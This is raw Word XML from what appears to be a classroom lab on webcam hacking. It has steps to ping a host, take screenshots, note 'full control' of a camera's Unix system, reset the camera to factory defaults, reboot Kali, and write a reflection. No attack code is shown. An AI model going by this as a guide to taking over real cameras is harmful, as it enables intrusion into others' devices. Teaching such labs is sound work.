        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Insert a screenshot:</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
        <w:id w:val="51045527"/>
        <w:placeholder>
          <w:docPart w:val="C11954347053461D90E7B4AF58646AA4"/>
        </w:placeholder>
        <w:showingPlcHdr/>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="DefaultParagraphFont"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="45A35586" w14:textId="77777777" w:rsidR="00317637" w:rsidRDefault="00317637" w:rsidP="0031763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45AB9340" w14:textId="4B8B66A0" w:rsidR="00C33916" w:rsidRPr="00C33916" w:rsidRDefault="00C33916" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Type </w:t>
      </w:r>
      <w:r w:rsidRPr="00C33916">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>ping google.com</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06CD3F6B" w14:textId="77777777" w:rsidR="00C33916" w:rsidRDefault="00C33916" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002531EE">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Insert a screenshot:</w:t>
      </w:r>
    </w:p>
    <w:sdt>
      <w:sdtPr>
        <w:rPr>
          <w:rStyle w:val="Red"/>
        </w:rPr>
        <w:id w:val="-2080963982"/>
        <w:placeholder>
          <w:docPart w:val="13DFDCFC23124F9387FD73F9E7A7BB2D"/>
        </w:placeholder>
        <w:showingPlcHdr/>
      </w:sdtPr>
      <w:sdtEndPr>
        <w:rPr>
          <w:rStyle w:val="DefaultParagraphFont"/>
          <w:color w:val="auto"/>
        </w:rPr>
      </w:sdtEndPr>
      <w:sdtContent>
        <w:p w14:paraId="0B06A7BE" w14:textId="77777777" w:rsidR="00C33916" w:rsidRDefault="00C33916" w:rsidP="00C33916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2614DD3C" w14:textId="4EB660C7" w:rsidR="00392701" w:rsidRDefault="00392701" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>You have full control of the camera</w:t>
      </w:r>
      <w:r w:rsidR="00BF66EF">
        <w:t xml:space="preserve"> Unix operating system</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00553B1B">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A547A5" w14:textId="7B51E499" w:rsidR="00967C52" w:rsidRPr="00967C52" w:rsidRDefault="00A81F4D" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>In the Web Browser, g</w:t>
      </w:r>
      <w:r w:rsidR="007C00AF">
        <w:t xml:space="preserve">o to </w:t>
      </w:r>
      <w:r w:rsidR="007C00AF" w:rsidRPr="001046E0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>System</w:t>
      </w:r>
      <w:r w:rsidR="007079F5">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007079F5" w:rsidRPr="007079F5">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidR="007C00AF">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007C00AF" w:rsidRPr="001046E0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Management</w:t>
      </w:r>
      <w:r w:rsidR="00C9543B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FBBC2D6" w14:textId="07F67BDA" w:rsidR="00967C52" w:rsidRDefault="00967C52" w:rsidP="00967C52">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Click Cancel on the following screen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE76671" w14:textId="109A3BD8" w:rsidR="00967C52" w:rsidRPr="00967C52" w:rsidRDefault="00967C52" w:rsidP="00967C52">
      <w:pPr>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5824C307" wp14:editId="155AD942">
            <wp:extent cx="2295144" cy="1508760"/>
            <wp:effectExtent l="38100" t="38100" r="86360" b="91440"/>
            <wp:docPr id="494948156" name="Picture 4949481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48156" name="Picture 49494815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50876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3CE7D" w14:textId="12726640" w:rsidR="007C00AF" w:rsidRDefault="00C9543B" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00C9543B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidR="007C00AF">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="007C00AF" w:rsidRPr="001046E0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Restore factory default settings:</w:t>
      </w:r>
      <w:r w:rsidR="007C00AF">
        <w:t xml:space="preserve"> Click </w:t>
      </w:r>
      <w:r w:rsidR="007C00AF" w:rsidRPr="001046E0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Reset</w:t>
      </w:r>
      <w:r w:rsidR="00C81652">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C81652">
        <w:sym w:font="Wingdings" w:char="F0E0"/>
      </w:r>
      <w:r w:rsidR="00C81652">
        <w:t xml:space="preserve"> Click </w:t>
      </w:r>
      <w:r w:rsidR="00C81652" w:rsidRPr="00C81652">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Reset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="026EE27E" w14:textId="08B180FE" w:rsidR="00A81F4D" w:rsidRPr="0028100E" w:rsidRDefault="00C81652" w:rsidP="003F15E4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="4"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Restart Kali: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C81652">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C81652">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> reboot</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35393CEA" w14:textId="68A1E925" w:rsidR="0028100E" w:rsidRDefault="0028100E" w:rsidP="0028100E">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc197157053"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Assignment 2: Reflection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="335C38A8" w14:textId="456719CA" w:rsidR="0028100E" w:rsidRPr="0028100E" w:rsidRDefault="0028100E" w:rsidP="0028100E">
      <w:r>
        <w:t>Add 200 words to your reflection document about what you think after going through the lab.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="658ACCF4" w14:textId="22B3CD26" w:rsidR="002157D8" w:rsidRDefault="002157D8" w:rsidP="00F65896">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc197157054"/>
      <w:r>
        <w:t>Assignment Submission</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="0977FB53" w14:textId="7FA7F0F0" w:rsidR="002531EE" w:rsidRDefault="002531EE" w:rsidP="004F133B">
      <w:r>
        <w:t xml:space="preserve">Attach this completed document </w:t>
      </w:r>
      <w:r w:rsidR="00142EE5">
        <w:t xml:space="preserve">and your reflection </w:t>
      </w:r>
      <w:r>
        <w:t>to the assignment in Blackboard.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AF15F4A" w14:textId="77777777" w:rsidR="00632618" w:rsidRPr="0024622F" w:rsidRDefault="00632618" w:rsidP="0024622F"/>
    <w:sectPr w:rsidR="00632618" w:rsidRPr="0024622F" w:rsidSect="00AA490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AA092" w14:textId="77777777" w:rsidR="005749C8" w:rsidRDefault="005749C8" w:rsidP="00731DAB">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="23F239DC" w14:textId="77777777" w:rsidR="005749C8" w:rsidRDefault="005749C8" w:rsidP="0073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53E1F" w14:textId="4A9188CC" w:rsidR="00731DAB" w:rsidRPr="00583B2E" w:rsidRDefault="004341BF" w:rsidP="00583B2E">
    <w:pPr>
      <w:pStyle w:val="Footer"/>
      <w:tabs>
        <w:tab w:val="center" w:pos="5040"/>
        <w:tab w:val="right" w:pos="10080"/>
      </w:tabs>
    </w:pPr>
    <w:proofErr w:type="spellStart"/>
    <w:r>
      <w:t>Web</w:t>
    </w:r>
    <w:r w:rsidR="006C014D">
      <w:t>C</w:t>
    </w:r>
    <w:r>
      <w:t>am</w:t>
    </w:r>
    <w:proofErr w:type="spellEnd"/>
    <w:r>
      <w:t xml:space="preserve"> </w:t>
    </w:r>
    <w:r w:rsidR="00E54F36">
      <w:t>Hacking</w:t>
    </w:r>
    <w:r w:rsidR="00583B2E" w:rsidRPr="00A87D54">
      <w:tab/>
      <w:t xml:space="preserve">Page </w:t>
    </w:r>
    <w:r w:rsidR="00583B2E" w:rsidRPr="00A87D54">
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r w:rsidR="00583B2E" w:rsidRPr="00A87D54">
      <w:instrText xml:space="preserve"> PAGE </w:instrText>
    </w:r>
    <w:r w:rsidR="00583B2E" w:rsidRPr="00A87D54">
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="00CB51E7">
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:t>1</w:t>
    </w:r>
    <w:r w:rsidR="00583B2E" w:rsidRPr="00A87D54">
      <w:fldChar w:fldCharType="end"/>
    </w:r>
    <w:r w:rsidR="00583B2E" w:rsidRPr="00A87D54">
      <w:t xml:space="preserve"> of </w:t>
    </w:r>
    <w:r w:rsidR="00067C71">
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:fldChar w:fldCharType="begin"/>
    </w:r>
    <w:r w:rsidR="00067C71">
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:instrText xml:space="preserve"> NUMPAGES </w:instrText>
    </w:r>
    <w:r w:rsidR="00067C71">
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:fldChar w:fldCharType="separate"/>
    </w:r>
    <w:r w:rsidR="00CB51E7">
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:t>2</w:t>
    </w:r>
    <w:r w:rsidR="00067C71">
      <w:rPr>
        <w:noProof/>
      </w:rPr>
      <w:fldChar w:fldCharType="end"/>
    </w:r>
    <w:r w:rsidR="00583B2E" w:rsidRPr="00A87D54">
      <w:tab/>
      <w:t xml:space="preserve">Revised: </w:t>
    </w:r>
    <w:r w:rsidR="003D5304">
      <w:t>0</w:t>
    </w:r>
    <w:r w:rsidR="00391566">
      <w:t>5</w:t>
    </w:r>
    <w:r w:rsidR="00DC7C0F">
      <w:t>/</w:t>
    </w:r>
    <w:r w:rsidR="00391566">
      <w:t>03</w:t>
    </w:r>
    <w:r w:rsidR="00DC7C0F">
      <w:t>/20</w:t>
    </w:r>
    <w:r w:rsidR="003A3344">
      <w:t>2</w:t>
    </w:r>
    <w:r w:rsidR="00F1424D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D7FC4" w14:textId="77777777" w:rsidR="005749C8" w:rsidRDefault="005749C8" w:rsidP="00731DAB">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="1E4921CE" w14:textId="77777777" w:rsidR="005749C8" w:rsidRDefault="005749C8" w:rsidP="0073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3C2546"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="561035BE"/>
    <w:lvl w:ilvl="0" w:tplc="FFFFFFF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090373BE"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="E8EC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5883CC4"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F6E8E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74572C4"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F6E8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96C5549"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="146A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6722CCC"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="F6E8E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1BD6663"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="61B62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41420E5"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="43B8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86658835">
    <w:abstractNumId w:val="27"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="654066629">
    <w:abstractNumId w:val="25"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="539976371">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="975137851">
    <w:abstractNumId w:val="34"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="1351570103">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="461466289">
    <w:abstractNumId w:val="15"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="628171474">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1066413260">
    <w:abstractNumId w:val="30"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1480608185">
    <w:abstractNumId w:val="22"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="1237201019">
    <w:abstractNumId w:val="48"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="981471909">
    <w:abstractNumId w:val="16"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="173033198">
    <w:abstractNumId w:val="43"/>
  </w:num>
  <w:num w:numId="13" w16cid:durableId="1300725756">
    <w:abstractNumId w:val="17"/>
  </w:num>
  <w:num w:numId="14" w16cid:durableId="1105030229">
    <w:abstractNumId w:val="28"/>
  </w:num>
  <w:num w:numId="15" w16cid:durableId="143395762">
    <w:abstractNumId w:val="14"/>
  </w:num>
  <w:num w:numId="16" w16cid:durableId="381254438">
    <w:abstractNumId w:val="13"/>
  </w:num>
  <w:num w:numId="17" w16cid:durableId="681779414">
    <w:abstractNumId w:val="37"/>
  </w:num>
  <w:num w:numId="18" w16cid:durableId="1925992658">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="19" w16cid:durableId="1427579412">
    <w:abstractNumId w:val="38"/>
  </w:num>
  <w:num w:numId="20" w16cid:durableId="1573813900">
    <w:abstractNumId w:val="41"/>
  </w:num>
  <w:num w:numId="21" w16cid:durableId="866916917">
    <w:abstractNumId w:val="33"/>
  </w:num>
  <w:num w:numId="22" w16cid:durableId="115491903">
    <w:abstractNumId w:val="29"/>
  </w:num>
  <w:num w:numId="23" w16cid:durableId="977145196">
    <w:abstractNumId w:val="47"/>
  </w:num>
  <w:num w:numId="24" w16cid:durableId="626007738">
    <w:abstractNumId w:val="19"/>
  </w:num>
  <w:num w:numId="25" w16cid:durableId="1790314693">
    <w:abstractNumId w:val="21"/>
  </w:num>
  <w:num w:numId="26" w16cid:durableId="1569538728">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="27" w16cid:durableId="686054317">
    <w:abstractNumId w:val="20"/>
  </w:num>
  <w:num w:numId="28" w16cid:durableId="805201598">
    <w:abstractNumId w:val="40"/>
  </w:num>
  <w:num w:numId="29" w16cid:durableId="1220438109">
    <w:abstractNumId w:val="44"/>
  </w:num>
  <w:num w:numId="30" w16cid:durableId="827751315">
    <w:abstractNumId w:val="11"/>
  </w:num>
  <w:num w:numId="31" w16cid:durableId="566115693">
    <w:abstractNumId w:val="46"/>
  </w:num>
  <w:num w:numId="32" w16cid:durableId="495221267">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="33" w16cid:durableId="1033073384">
    <w:abstractNumId w:val="45"/>
  </w:num>
  <w:num w:numId="34" w16cid:durableId="1246649681">
    <w:abstractNumId w:val="26"/>
  </w:num>
  <w:num w:numId="35" w16cid:durableId="215161254">
    <w:abstractNumId w:val="18"/>
  </w:num>
  <w:num w:numId="36" w16cid:durableId="1670139100">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="37" w16cid:durableId="659312795">
    <w:abstractNumId w:val="24"/>
  </w:num>
  <w:num w:numId="38" w16cid:durableId="723137357">
    <w:abstractNumId w:val="35"/>
  </w:num>
  <w:num w:numId="39" w16cid:durableId="735395464">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="40" w16cid:durableId="2014721954">
    <w:abstractNumId w:val="42"/>
  </w:num>
  <w:num w:numId="41" w16cid:durableId="839275580">
    <w:abstractNumId w:val="23"/>
  </w:num>
  <w:num w:numId="42" w16cid:durableId="1128816795">
    <w:abstractNumId w:val="12"/>
  </w:num>
  <w:num w:numId="43" w16cid:durableId="420688700">
    <w:abstractNumId w:val="32"/>
  </w:num>
  <w:num w:numId="44" w16cid:durableId="906837030">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="45" w16cid:durableId="1033188839">
    <w:abstractNumId w:val="31"/>
  </w:num>
  <w:num w:numId="46" w16cid:durableId="1069039124">
    <w:abstractNumId w:val="39"/>
  </w:num>
  <w:num w:numId="47" w16cid:durableId="936524891">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="48" w16cid:durableId="111482547">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="49" w16cid:durableId="2322168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C"/>
    <w:rsid w:val="00013538"/>
    <w:rsid w:val="00020A6B"/>
    <w:rsid w:val="00021349"/>
    <w:rsid w:val="00035925"/>
    <w:rsid w:val="00035D7C"/>
    <w:rsid w:val="000363E0"/>
    <w:rsid w:val="000370E4"/>
    <w:rsid w:val="0004148C"/>
    <w:rsid w:val="00044B63"/>
    <w:rsid w:val="00045AFC"/>
    <w:rsid w:val="000570B5"/>
    <w:rsid w:val="000578A5"/>
    <w:rsid w:val="00060211"/>
    <w:rsid w:val="00067C71"/>
    <w:rsid w:val="0007506D"/>
    <w:rsid w:val="00090648"/>
    <w:rsid w:val="000972F7"/>
    <w:rsid w:val="000A1BD7"/>
    <w:rsid w:val="000B107E"/>
    <w:rsid w:val="000B5AE1"/>
    <w:rsid w:val="000B61EB"/>
    <w:rsid w:val="000C3319"/>
    <w:rsid w:val="000D2683"/>
    <w:rsid w:val="000D60DF"/>
    <w:rsid w:val="000E069D"/>
    <w:rsid w:val="000E1CF1"/>
    <w:rsid w:val="000E3F78"/>
    <w:rsid w:val="000F19AC"/>
    <w:rsid w:val="000F468B"/>
    <w:rsid w:val="001010BD"/>
    <w:rsid w:val="00103088"/>
    <w:rsid w:val="001046E0"/>
    <w:rsid w:val="001064FD"/>
    <w:rsid w:val="00114E70"/>
    <w:rsid w:val="001237C9"/>
    <w:rsid w:val="001335C8"/>
    <w:rsid w:val="00141171"/>
    <w:rsid w:val="00142EE5"/>
    <w:rsid w:val="00152269"/>
    <w:rsid w:val="00152A4E"/>
    <w:rsid w:val="00174490"/>
    <w:rsid w:val="0017751A"/>
    <w:rsid w:val="0019359F"/>
    <w:rsid w:val="00195F36"/>
    <w:rsid w:val="00197B05"/>
    <w:rsid w:val="001B4A27"/>
    <w:rsid w:val="001B5092"/>
    <w:rsid w:val="001C3640"/>
    <w:rsid w:val="001C5B95"/>
    <w:rsid w:val="001E0CDC"/>
    <w:rsid w:val="001E26FD"/>
    <w:rsid w:val="001E5828"/>
    <w:rsid w:val="00211340"/>
    <w:rsid w:val="0021227F"/>
    <w:rsid w:val="00214A90"/>
    <w:rsid w:val="002157D8"/>
    <w:rsid w:val="00220E25"/>
    <w:rsid w:val="00221C48"/>
    <w:rsid w:val="002375E9"/>
    <w:rsid w:val="00241C30"/>
    <w:rsid w:val="00245029"/>
    <w:rsid w:val="0024622F"/>
    <w:rsid w:val="002531EE"/>
    <w:rsid w:val="00254A8D"/>
    <w:rsid w:val="002630CF"/>
    <w:rsid w:val="0026599D"/>
    <w:rsid w:val="00277DD7"/>
    <w:rsid w:val="0028100E"/>
    <w:rsid w:val="00281871"/>
    <w:rsid w:val="0029621C"/>
    <w:rsid w:val="002B0824"/>
    <w:rsid w:val="002B0FE0"/>
    <w:rsid w:val="002C3FC4"/>
    <w:rsid w:val="002E059F"/>
    <w:rsid w:val="002E671B"/>
    <w:rsid w:val="002E6CBD"/>
    <w:rsid w:val="002F0E8D"/>
    <w:rsid w:val="00300A5F"/>
    <w:rsid w:val="0030189C"/>
    <w:rsid w:val="003101BB"/>
    <w:rsid w:val="00317637"/>
    <w:rsid w:val="00317966"/>
    <w:rsid w:val="0032159F"/>
    <w:rsid w:val="00331145"/>
    <w:rsid w:val="003344BE"/>
    <w:rsid w:val="00351A82"/>
    <w:rsid w:val="0035780E"/>
    <w:rsid w:val="003635E4"/>
    <w:rsid w:val="003757F4"/>
    <w:rsid w:val="00380750"/>
    <w:rsid w:val="00382EA1"/>
    <w:rsid w:val="00384E1D"/>
    <w:rsid w:val="00391566"/>
    <w:rsid w:val="00392701"/>
    <w:rsid w:val="003960B8"/>
    <w:rsid w:val="00396977"/>
    <w:rsid w:val="00397ACB"/>
    <w:rsid w:val="003A3344"/>
    <w:rsid w:val="003A383B"/>
    <w:rsid w:val="003C56D4"/>
    <w:rsid w:val="003C7F9E"/>
    <w:rsid w:val="003D1248"/>
    <w:rsid w:val="003D5304"/>
    <w:rsid w:val="003D6903"/>
    <w:rsid w:val="003F15E4"/>
    <w:rsid w:val="003F7A3D"/>
    <w:rsid w:val="00402962"/>
    <w:rsid w:val="00424535"/>
    <w:rsid w:val="00427955"/>
    <w:rsid w:val="004337DC"/>
    <w:rsid w:val="00433F16"/>
    <w:rsid w:val="004341BF"/>
    <w:rsid w:val="00435B53"/>
    <w:rsid w:val="00436982"/>
    <w:rsid w:val="00456A84"/>
    <w:rsid w:val="00460BC5"/>
    <w:rsid w:val="00471D33"/>
    <w:rsid w:val="00473FB9"/>
    <w:rsid w:val="00483118"/>
    <w:rsid w:val="00490EF1"/>
    <w:rsid w:val="00493C07"/>
    <w:rsid w:val="00493D8A"/>
    <w:rsid w:val="004A0840"/>
    <w:rsid w:val="004B0062"/>
    <w:rsid w:val="004B26F5"/>
    <w:rsid w:val="004B5BAF"/>
    <w:rsid w:val="004B6B34"/>
    <w:rsid w:val="004C375B"/>
    <w:rsid w:val="004D007D"/>
    <w:rsid w:val="004E14B4"/>
    <w:rsid w:val="004F133B"/>
    <w:rsid w:val="004F6CB2"/>
    <w:rsid w:val="00506C25"/>
    <w:rsid w:val="0051008A"/>
    <w:rsid w:val="00533BBE"/>
    <w:rsid w:val="0053405F"/>
    <w:rsid w:val="00542E2C"/>
    <w:rsid w:val="005445DD"/>
    <w:rsid w:val="00545054"/>
    <w:rsid w:val="005470EF"/>
    <w:rsid w:val="00553B1B"/>
    <w:rsid w:val="005749C8"/>
    <w:rsid w:val="005772AB"/>
    <w:rsid w:val="00583765"/>
    <w:rsid w:val="00583B2E"/>
    <w:rsid w:val="00585F70"/>
    <w:rsid w:val="00586033"/>
    <w:rsid w:val="00593FBB"/>
    <w:rsid w:val="00594032"/>
    <w:rsid w:val="00596424"/>
    <w:rsid w:val="005A13BE"/>
    <w:rsid w:val="005A1560"/>
    <w:rsid w:val="005B1FDD"/>
    <w:rsid w:val="005B4CC0"/>
    <w:rsid w:val="005B6BDF"/>
    <w:rsid w:val="005D66E8"/>
    <w:rsid w:val="005E407E"/>
    <w:rsid w:val="005E608D"/>
    <w:rsid w:val="005E67EF"/>
    <w:rsid w:val="005E7A64"/>
    <w:rsid w:val="005F58D4"/>
    <w:rsid w:val="005F7312"/>
    <w:rsid w:val="006115BE"/>
    <w:rsid w:val="006127BB"/>
    <w:rsid w:val="00625B2D"/>
    <w:rsid w:val="0063196A"/>
    <w:rsid w:val="00632618"/>
    <w:rsid w:val="00633693"/>
    <w:rsid w:val="006402C1"/>
    <w:rsid w:val="006903F5"/>
    <w:rsid w:val="006C014D"/>
    <w:rsid w:val="006D5F7B"/>
    <w:rsid w:val="006F036D"/>
    <w:rsid w:val="006F094E"/>
    <w:rsid w:val="006F2687"/>
    <w:rsid w:val="007079F5"/>
    <w:rsid w:val="00707A53"/>
    <w:rsid w:val="00710427"/>
    <w:rsid w:val="00711CCD"/>
    <w:rsid w:val="007169FA"/>
    <w:rsid w:val="00720C66"/>
    <w:rsid w:val="00722AE2"/>
    <w:rsid w:val="00726E71"/>
    <w:rsid w:val="00730B8F"/>
    <w:rsid w:val="00731DAB"/>
    <w:rsid w:val="00732592"/>
    <w:rsid w:val="007719EF"/>
    <w:rsid w:val="00782AA1"/>
    <w:rsid w:val="007965C9"/>
    <w:rsid w:val="007A1C2D"/>
    <w:rsid w:val="007A1D09"/>
    <w:rsid w:val="007A78F8"/>
    <w:rsid w:val="007B5937"/>
    <w:rsid w:val="007C00AF"/>
    <w:rsid w:val="007C5C7F"/>
    <w:rsid w:val="007D2723"/>
    <w:rsid w:val="007D28E3"/>
    <w:rsid w:val="007D6204"/>
    <w:rsid w:val="007D7932"/>
    <w:rsid w:val="007E5C67"/>
    <w:rsid w:val="007F049E"/>
    <w:rsid w:val="007F2270"/>
    <w:rsid w:val="007F6BB7"/>
    <w:rsid w:val="00801642"/>
    <w:rsid w:val="00801857"/>
    <w:rsid w:val="008107BC"/>
    <w:rsid w:val="008178A2"/>
    <w:rsid w:val="00845876"/>
    <w:rsid w:val="00852AC7"/>
    <w:rsid w:val="00877F4D"/>
    <w:rsid w:val="00891CE8"/>
    <w:rsid w:val="0089604E"/>
    <w:rsid w:val="008967D2"/>
    <w:rsid w:val="00896CB3"/>
    <w:rsid w:val="00897B62"/>
    <w:rsid w:val="008A07BB"/>
    <w:rsid w:val="008A6FBA"/>
    <w:rsid w:val="008A72CA"/>
    <w:rsid w:val="008C14A2"/>
    <w:rsid w:val="008C1A53"/>
    <w:rsid w:val="008C6184"/>
    <w:rsid w:val="008C6651"/>
    <w:rsid w:val="008E04AD"/>
    <w:rsid w:val="008E5AB3"/>
    <w:rsid w:val="008F3897"/>
    <w:rsid w:val="0090483C"/>
    <w:rsid w:val="00915F78"/>
    <w:rsid w:val="00930FB8"/>
    <w:rsid w:val="00935A2A"/>
    <w:rsid w:val="00936703"/>
    <w:rsid w:val="00960DB4"/>
    <w:rsid w:val="009634B0"/>
    <w:rsid w:val="009658F7"/>
    <w:rsid w:val="009664C5"/>
    <w:rsid w:val="00967C52"/>
    <w:rsid w:val="00984458"/>
    <w:rsid w:val="00985EC9"/>
    <w:rsid w:val="009864FA"/>
    <w:rsid w:val="00987DFA"/>
    <w:rsid w:val="009945C1"/>
    <w:rsid w:val="00994CA6"/>
    <w:rsid w:val="009B3A17"/>
    <w:rsid w:val="009C19C8"/>
    <w:rsid w:val="009C367C"/>
    <w:rsid w:val="009D0EE2"/>
    <w:rsid w:val="009D29CF"/>
    <w:rsid w:val="009E1736"/>
    <w:rsid w:val="009E4751"/>
    <w:rsid w:val="009E5846"/>
    <w:rsid w:val="009E6642"/>
    <w:rsid w:val="00A00868"/>
    <w:rsid w:val="00A00DED"/>
    <w:rsid w:val="00A019F3"/>
    <w:rsid w:val="00A12D22"/>
    <w:rsid w:val="00A16ABF"/>
    <w:rsid w:val="00A22E6C"/>
    <w:rsid w:val="00A303DB"/>
    <w:rsid w:val="00A4546B"/>
    <w:rsid w:val="00A568D2"/>
    <w:rsid w:val="00A754D7"/>
    <w:rsid w:val="00A81F4D"/>
